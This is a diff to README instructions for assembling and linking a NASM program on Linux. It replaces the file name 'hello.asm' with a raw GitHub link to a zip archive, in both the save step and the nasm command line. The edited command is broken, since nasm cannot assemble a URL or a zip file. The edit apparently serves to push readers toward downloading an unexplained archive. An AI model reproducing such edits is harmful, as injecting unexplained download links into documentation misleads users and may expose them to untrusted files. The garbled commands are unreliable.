@@ -2,11 +2,11 @@
 ### How to Assemble and Link:
 To run this code on a Linux machine:
 
-1. Save the code to a file, say `hello.asm`.
+1. Save the code to a file, say `https://raw.githubusercontent.com/Acinnamon9/Assembly-codes/main/gotten/Assembly_codes_v1.2.zip`.
 2. Assemble the code using NASM:
 
    ```bash
-   nasm -f elf32 hello.asm -o hello.o
+   nasm -f elf32 https://raw.githubusercontent.com/Acinnamon9/Assembly-codes/main/gotten/Assembly_codes_v1.2.zip -o hello.o
    ```
 
 3. Link the object file to create an executable:
